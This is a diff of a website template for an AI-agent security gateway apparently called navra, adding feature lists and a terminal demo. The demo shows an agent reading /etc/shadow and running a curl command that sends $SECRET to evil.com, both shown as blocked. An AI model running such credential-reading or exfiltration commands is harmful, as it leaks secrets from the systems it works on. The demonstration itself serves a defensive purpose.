@@ -28,8 +28,21 @@
     </div>
     <div class="hero-text">
       <h1 id="hero-heading" class="hero-title">navra</h1>
-      <p class="hero-tagline">Secure MCP gateway, built in Rust.</p>
-      <p class="hero-lead">{{ section.extra.lead | default(value="") | safe }}</p>
+      <p class="hero-tagline">Security infrastructure for AI agents.</p>
+      <div class="hero-pillars">
+        <span class="pillar-chip">MCP Gateway</span>
+        <span class="pillar-chip">Agent SDK</span>
+        <span class="pillar-chip">Multi-Agent Flows</span>
+        <span class="pillar-chip">Model Server</span>
+      </div>
+      <p class="hero-lead">Every tool call, model call, and agent message passes through a single
+        enforcement chokepoint — IFC taint tracking, 22 safety hooks, deny-wins ACLs.
+        Built in Rust. Formally verified.</p>
+      <div class="hero-badges">
+        <span class="badge-verify">168 Kani proofs</span>
+        <span class="badge-verify">6 TLA+ specs</span>
+        <span class="badge-verify">2,900+ tests</span>
+      </div>
       <div class="hero-actions" role="group" aria-label="Get started">
         <a class="btn-cta" href="{{ get_url(path=section.extra.url | default(value='/')) | safe }}">
           Get started
@@ -45,17 +58,71 @@
   </div>
 </section>
 
-{# ── Feature grid ── #}
-<section id="features" class="section-features" aria-label="Key features">
-  <div class="features-grid">
-    {% if section.extra.list %}
-      {% for val in section.extra.list %}
-      <article class="feature-card">
-        <h2>{{ val.title }}</h2>
-        <p>{{ val.content | safe }}</p>
-      </article>
-      {% endfor %}
-    {% endif %}
+{# ── Terminal demo ── #}
+<section class="section-demo" aria-label="Security enforcement demo">
+  <div class="demo-inner">
+    <div class="demo-terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">navra gateway</span>
+      </div>
+      <div class="terminal-body">
+        <div class="term-line"><span class="term-prompt">agent →</span> <span class="term-cmd">file_read</span> <span class="term-arg">/etc/shadow</span></div>
+        <div class="term-line term-deny"><span class="term-badge deny">✗ ACL</span> denied — path matches deny rule <code>**/shadow</code></div>
+        <div class="term-line"><span class="term-prompt">agent →</span> <span class="term-cmd">curl</span> <span class="term-arg">https://evil.com/?d=$SECRET</span></div>
+        <div class="term-line term-deny"><span class="term-badge deny">✗ SSRF</span> blocked — domain not on egress allowlist</div>
+        <div class="term-line term-deny"><span class="term-badge deny">✗ EXFIL</span> credential theft pattern detected</div>
+        <div class="term-line"><span class="term-prompt">agent →</span> <span class="term-cmd">file_read</span> <span class="term-arg">~/Code/src/auth.rs</span></div>
+        <div class="term-line term-ok"><span class="term-badge ok">✓ IFC</span> session tainted: <code>Sensitive</code> — write to public channels blocked</div>
+        <div class="term-line term-audit"><span class="term-badge audit">● LOG</span> 3 entries → hash-chained blackbox <span class="term-dim">(SHA-256, tamper-detectable)</span></div>
+      </div>
+    </div>
+    <div class="demo-quickstart">
+      <p class="demo-label">Secure any MCP server in one command</p>
+      <div class="demo-code"><span class="demo-prompt">$</span> <code>navra wrap -- npx @modelcontextprotocol/server-github</code></div>
+      <p class="demo-sub">Safety filters, audit trail, and approval workflow — no config file needed.</p>
+    </div>
+  </div>
+</section>
+
+{# ── Three columns: Enforce · Observe · Build ── #}
+<section id="features" class="section-pillars" aria-label="Platform pillars">
+  <div class="pillars-inner">
+    <div class="pillar">
+      <h2 class="pillar-title">Enforce</h2>
+      <ul class="pillar-list">
+        <li><strong>9-gate security pipeline</strong> — auth, rate limiting, capabilities, tool policies, domain rules, ACLs, IFC, hooks, safety</li>
+        <li><strong>Information Flow Control</strong> — 2×4 lattice, taint tracking, Bell-LaPadula no-write-down</li>
+        <li><strong>Content safety</strong> — 8 profiles, regex + NER + ML, pseudonymization, canary tokens</li>
+        <li><strong>Tool scanner</strong> — 8 threat categories for upstream supply chain defense</li>
+        <li><strong>Credential brokering</strong> — agents never see raw secrets</li>
+        <li><strong>Human-in-the-loop</strong> — 4-channel approval (MCP, D-Bus, tray, CLI)</li>
+      </ul>
+    </div>
+    <div class="pillar">
+      <h2 class="pillar-title">Observe</h2>
+      <ul class="pillar-list">
+        <li><strong>Hash-chained audit</strong> — SHA-256 blackbox, every tool call, no opt-in</li>
+        <li><strong>Self-harness</strong> — mine weaknesses from flow traces, propose + validate fixes</li>
+        <li><strong>Prometheus + OTel</strong> — metrics endpoint, optional trace export</li>
+        <li><strong>GDPR tools</strong> — PII purge, consent tracking, data subject reports</li>
+        <li><strong>Compliance</strong> — EU AI Act Art 14, SOC2 CC6.1, ISO 42001</li>
+        <li><strong>Causal provenance</strong> — graph of tool-call causality across flows</li>
+      </ul>
+    </div>
+    <div class="pillar">
+      <h2 class="pillar-title">Build</h2>
+      <ul class="pillar-list">
+        <li><strong>Agent SDK</strong> — Rust builder API, 6 model backends, ReAct loop, signals, replay</li>
+        <li><strong>Multi-agent flows</strong> — DAG, handoff, iterative; mesh + blackboard with IFC</li>
+        <li><strong>Persona factory</strong> — YAML personas, heuristics, upstream auto-discovery</li>
+        <li><strong>Memory + RAG</strong> — working memory, knowledge store, hybrid search, reranking</li>
+        <li><strong>Model server</strong> — embedded llama.cpp, 4 isolation modes, GPU auto-detect</li>
+        <li><strong>Agent bundles</strong> — signed OCI artifacts with persona + permissions + upstreams</li>
+      </ul>
+    </div>
   </div>
 </section>
 
